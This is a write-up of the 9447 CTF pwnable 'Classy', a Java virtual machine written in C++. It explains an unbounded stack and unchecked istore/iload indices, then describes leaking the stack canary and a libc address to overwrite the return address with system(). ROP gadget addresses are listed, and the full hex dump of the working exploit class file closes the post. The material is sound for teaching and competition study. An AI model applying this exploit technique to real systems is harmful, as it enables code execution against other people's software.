## Classy 9447 CTF Pwnable 430

We ranked 10th in the recent 9447 CTF games. And here is a writeup about
pwnable Classy.

### Introduction

The binary is about 150KB large, which is a Java virtual machine written in
C++. Your input is a Java Class file and then the jvm runs it. Mainly, the
class could only have two methods: <init> and main, and limited ojects:
Integer, String and StringBuilder. Many Java opcodes are not supported, and
also limited virtual calls of the objects are supported.

NX & ASLR & stack canary is enabled.

### Vulnerability

Let's focus on the realization of the Java opcodes. We know that Java opcodes
manipulate data on the stack.

And the vulnerability is that this jvm does not have any check on the bound of
the size of the Java stack and more important thing is that the Java stack and
the native stack share one area.

There are some Java opcodes like istore i or iload i which means get the local
variable #i and save the local variable #i from or to the stack. Another
vulnerability is that there is no check on the range of the index i which means
you could do a read-where and write-where.

However, things are not very easy. Everytime we push a integer on the stack, 8
bytes are pushed, where the first 4 bytes are 0x2f and the last 4 bytes are the
value of the integer. 0x2f is an identifier of the Integer object.

### Exploitation

Actually there are mainly two ways to put the data onto the stack. One is to
use push-like opcodes, which pushes the data onto the top of the stack. The
other is to use istore i or iload i which I mentioned above.

As we can specify index #i, we can write anywhere we want on the stack but in a
very strange manner :-), looks like this

	[0x2f][0x41414141][0x2f][0x41414141]...[0x2f][0x41414141]

We can control 4 bytes in every 8 bytes. By setting #i, we can directly rewrite
stored return address on the stack, skipping the stack canary. Yeah, now we can
do ROP, but a more difficult situation. 0x2f should be popped out otherwise it
will give us many troubles. Actually we do not find a way to construct a such a
ROP chain to get a shell XD. However it could be when we look into other team's
writeups after the game, by using these three gadgets to do write-where:

	[0x08053f49] pop edi ; pop ebx ; pop ebp ; ret
	[0x0804fbb1] mov eax, dword ptr [esp + 0xc] ; mov dword ptr [esp], eax ; pop eax ; ret 4
	[0x08059917] add dword ptr [ebx + 0x5f5e30c4], eax ; pop ebp ; ret 4

Now let me introduce the way we exploit during the game. The key is that the
base of local variables and the base of the stack actually has a difference of
4 bytes. So we can do something like this:

	[0x2f][0x2f][0x2f]([0x2f][Canary])...[0x2f][0x2f][RET]...[0x2f]([0x2f][main()'s RET])

At first, we use opcodes bipush 47 to push many Integer 0x2f onto the stack,
and stop just before the canary. Then we use iload to load the canary. Because
of the 4 bytes difference, 0x2f before the canary which is just the value
pushed by us is now used to be the fake identifier, and we confuse the jvm to
convince that the canary on the stack is a Java Integer Object. Then we use
istore to store the canary somewhere on the stack.

We know that the main() function's return address is on the stack and this
address is in libc file. We can use the same way as I describe above and iload
this address(info leak done), and push the offset(between this address and
system address) onto the stack, then use Java opcode iadd to get the real
address of system. Use istore to put it on the location of the return address
of the current function, another istore to store back the stack canary, and the
third istore to give the argument of system and finally get a shell.

I generated a normal Java Class file and edited on it to do the exploit. 010
Editor and its template helps me a lot. :) Here is the exploit we used in the
game:

```text
CA FE BA BE 00 00 00 2E 00 19 07 00 02 01 00 10
68 65 6C 6C 6F 77 6F 72 6C 64 2F 48 65 6C 6C 6F
07 00 04 01 00 10 6A 61 76 61 2F 6C 61 6E 67 2F
4F 62 6A 65 63 74 01 00 06 3C 69 6E 69 74 3E 01
00 03 28 29 56 01 00 04 43 6F 64 65 0A 00 03 00
09 0C 00 05 00 06 01 00 0F 4C 69 6E 65 4E 75 6D
62 65 72 54 61 62 6C 65 01 00 12 4C 6F 63 61 6C
56 61 72 69 61 62 6C 65 54 61 62 6C 65 01 00 04
74 68 69 73 01 00 12 4C 68 65 6C 6C 6F 77 6F 72
6C 64 2F 48 65 6C 6C 6F 3B 01 00 04 6D 61 69 6E
01 00 16 28 5B 4C 6A 61 76 61 2F 6C 61 6E 67 2F
53 74 72 69 6E 67 3B 29 56 03 41 41 41 41 03 00        Java constant pool here: 
02 61 DD 03 (08 06 02 D2) 01 00 04 61 72 67 73 01  <--- the difference between
00 13 5B 4C 6A 61 76 61 2F 6C 61 6E 67 2F 53 74         main()'ret and system address
72 69 6E 67 3B 01 00 01 69 01 00 01 49 01 00 0A
53 6F 75 72 63 65 46 69 6C 65 01 00 0A 48 65 6C
6C 6F 2E 6A 61 76 61 00 21 00 01 00 03 00 00 00
00 00 02 00 01 00 05 00 06 00 01 00 07 00 00 00
2F 00 01 00 01 00 00 00 05 2A B7 00 08 B1 00 00
00 02 00 0A 00 00 00 06 00 01 00 00 00 03 00 0B
00 00 00 0C 00 01 00 00 00 05 00 0C 00 0D 00 00
00 09 00 0E 00 0F 00 01 00 07 00 00 03 45 00 01
00 02 00 00 01 51 (10 2F 10 2F 10 2F 10 2F 10 2F  <--- Java opcodes to exploit
10 2F 10 2F 10 2F 10 2F 15 0D 36 08 10 2F 10 2F
10 2F 10 2F 10 2F 10 2F 10 2F 10 2F 10 2F 10 2F
10 2F 10 2F 10 2F 10 2F 10 2F 10 2F 10 2F 10 2F
10 2F 10 2F 10 2F 10 2F 10 2F 10 2F 10 2F 10 2F
10 2F 10 2F 10 2F 10 2F 10 2F 10 2F 15 2D 12 11
60 36 09 15 08 36 0D 15 09 36 0F 12 12 36 10) 00
00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 B1 00 00 00 02 00 0A 00 00 01
C6 00 71 00 00 00 06 00 03 00 07 00 06 00 08 00
09 00 09 00 0C 00 0A 00 0F 00 0B 00 12 00 0C 00
15 00 0D 00 18 00 0E 00 1B 00 0F 00 1E 00 10 00
21 00 11 00 24 00 12 00 27 00 13 00 2A 00 14 00
2D 00 15 00 30 00 16 00 33 00 17 00 36 00 18 00
39 00 19 00 3C 00 1A 00 3F 00 1B 00 42 00 1C 00
45 00 1D 00 48 00 1E 00 4B 00 1F 00 4E 00 20 00
51 00 21 00 54 00 22 00 57 00 23 00 5A 00 24 00
5D 00 25 00 60 00 26 00 63 00 27 00 66 00 28 00
69 00 29 00 6C 00 2A 00 6F 00 2B 00 72 00 2C 00
75 00 2D 00 78 00 2E 00 7B 00 2F 00 7E 00 30 00
81 00 31 00 84 00 32 00 87 00 33 00 8A 00 34 00
8D 00 35 00 90 00 36 00 93 00 37 00 96 00 38 00
99 00 39 00 9C 00 3A 00 9F 00 3B 00 A2 00 3C 00
A5 00 3D 00 A8 00 3E 00 AB 00 3F 00 AE 00 40 00
B1 00 41 00 B4 00 42 00 B7 00 43 00 BA 00 44 00
BD 00 45 00 C0 00 46 00 C3 00 47 00 C6 00 48 00
C9 00 49 00 CC 00 4A 00 CF 00 4B 00 D2 00 4C 00
D5 00 4D 00 D8 00 4E 00 DB 00 4F 00 DE 00 50 00
E1 00 51 00 E4 00 52 00 E7 00 53 00 EA 00 54 00
ED 00 55 00 F0 00 56 00 F3 00 57 00 F6 00 58 00
F9 00 59 00 FC 00 5A 00 FF 00 5B 01 02 00 5C 01
05 00 5D 01 08 00 5E 01 0B 00 5F 01 0E 00 60 01
11 00 61 01 14 00 62 01 17 00 63 01 1A 00 64 01
1D 00 65 01 20 00 66 01 23 00 67 01 26 00 68 01
29 00 69 01 2C 00 6A 01 2F 00 6B 01 32 00 6C 01
35 00 6D 01 38 00 6E 01 3B 00 6F 01 3E 00 70 01
41 00 71 01 44 00 72 01 47 00 73 01 4A 00 74 01
4D 00 75 01 50 00 76 00 0B 00 00 00 16 00 02 00
00 01 51 00 13 00 14 00 00 00 03 01 4E 00 15 00
16 00 01 00 01 00 17 00 00 00 02 00 18
```

### Conclusion

It is a very interesting pwning problem since its file-based type and closed to
practice. I like it, and thanks to slipper for the most reversing work :D.

memeda@0ops
